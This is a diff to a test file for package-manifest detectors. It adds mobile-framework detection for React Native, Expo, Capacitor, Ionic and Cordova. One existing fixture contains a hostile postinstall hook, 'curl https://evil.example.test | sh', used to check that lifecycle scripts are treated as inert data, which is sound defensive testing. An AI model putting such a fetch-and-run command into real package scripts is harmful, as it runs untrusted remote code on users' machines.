@@ -118,6 +118,7 @@ describe("manifest detectors", () => {
         id: "react",
         label: "React",
         package: "react",
+        mobile: false,
         specifiers: { dependencies: "^18.3.1", peerDependencies: ">=18" },
       });
       expect(keys(document, "frameworks")).toEqual(["packages/api/package.json#express", "packages/web/package.json#react"]);
@@ -213,6 +214,26 @@ describe("manifest detectors", () => {
     });
   });
 
+  describe("hybrid mobile applications", () => {
+    it("reports React Native, marked as mobile, and React, each with its declared specifier", async () => {
+      const { document } = await profile({ "package.json": json({ name: "app", dependencies: { "react-native": "0.76.5", react: "18.3.1" } }) });
+      expect(valueOf(document, "frameworks", "package.json#react-native")).toEqual({ manifest: "package.json", id: "react-native", label: "React Native", package: "react-native", mobile: true, specifiers: { dependencies: "0.76.5" } });
+      expect(valueOf(document, "frameworks", "package.json#react")).toMatchObject({ mobile: false, specifiers: { dependencies: "18.3.1" } });
+    });
+
+    it.each([
+      ["Expo", { expo: "~52.0.0" }, "expo", "expo"],
+      ["Capacitor", { "@capacitor/core": "^6.1.0" }, "capacitor", "@capacitor/core"],
+      ["Ionic, by its React package", { "@ionic/react": "^8.3.0", "@ionic/core": "^8.3.0" }, "ionic", "@ionic/react"],
+      ["Ionic, by its Angular package", { "@ionic/angular": "^8.3.0" }, "ionic", "@ionic/angular"],
+      ["Cordova, by its platform packages", { "cordova-android": "^13.0.0", "cordova-ios": "^7.1.0" }, "cordova", "cordova-android"],
+    ])("marks %s as mobile", async (_name, dependencies, id, packageName) => {
+      const { document } = await profile({ "package.json": json({ name: "app", dependencies }) });
+      expect(valueOf(document, "frameworks", `package.json#${id}`)).toMatchObject({ id, package: packageName, mobile: true });
+      expect(keys(document, "frameworks")).toEqual([`package.json#${id}`]);
+    });
+  });
+
   describe("conflicts and unreadable manifests", () => {
     it("reports a conflict when the packageManager field and a lockfile disagree", async () => {
       const { document } = await profile({ "package.json": json({ name: "app", packageManager: "pnpm@9.1.0" }), "package-lock.json": "{}\n" });
@@ -246,7 +267,7 @@ describe("manifest detectors", () => {
     });
 
     it("treats scripts and lifecycle hooks as inert data", async () => {
-      const { document } = await profile({ "package.json": json({ name: "app", scripts: { preinstall: "node -e \"require('fs').writeFileSync('/tmp/fabricate-ran','x')\"", postinstall: "curl https://evil.example.test | sh" } }) });
+      const { document } = await profile({ "package.json": json({ name: "app", scripts: { preinstall: "node -e \"require('fs').writeFileSync('/tmp/surveyor-ran','x')\"", postinstall: "curl https://evil.example.test | sh" } }) });
       expect(keys(document, "scripts")).toEqual(["package.json#postinstall", "package.json#preinstall"]);
     });
   });
